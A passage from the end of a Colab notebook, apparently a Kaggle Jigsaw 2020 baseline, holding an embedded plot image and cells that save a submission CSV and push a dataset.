wX2DjmUibNKuZOFc0yd/T42SRnVtWjY61qvF4LfKSq/irJS4GPJnlRVf3fuAubJB4ZTIa+HseR5BXAnwGvqqofjai2cVlsTJ4BvAjoJNkDnAvsOMovIvfzPtkL7Kiqn1TV14D/ZC4cjlb9jMkm4HqAqvp34CnMPcBOXQyDybDo4ziSvAT4W+aC4Gg/DwyLjElVPVZVp1TVdFVNM3cd5VVVded4yh2Jfh7b8o/MHRWQ5BTmThs9MMoiR6yfMfkGcB5Akl9lLgy+PdIqjwCGwQSoqoPAocdx3AdcX1X3JHlnkle1bn8BPB34ZJIvJDmqn93U55gcU/ock1uA7ya5F7gN+OOq+u54Kl55fY7JFuBNSb4IfBzYWO3WIv2cj6OQJHlkIEkyDCRJGAaSJAwDSRKGgSQJw0CShGEgSQL+Hw372KUetun9AAAAAElFTkSuQmCC\n",
            "text/plain": [
              "<Figure size 432x288 with 1 Axes>"
            ]
          },
          "metadata": {
            "tags": [],
            "needs_background": "light"
          }
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab_type": "code",
        "id": "RRr-yzJ_yVTW",
        "colab": {}
      },
      "source": [
        "submission.to_csv(f'{ROOT_PATH}/submission.csv')"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab_type": "code",
        "id": "ARz9TllfyVVa",
        "colab": {}
      },
      "source": [
        "# !cp log.txt '/content/drive/My Drive/jigsaw2020-kaggle-public-baseline/'\n",
        "!make push_dataset"
      ],
      "execution_count": 0,
      "outputs": []
    }
  ]
}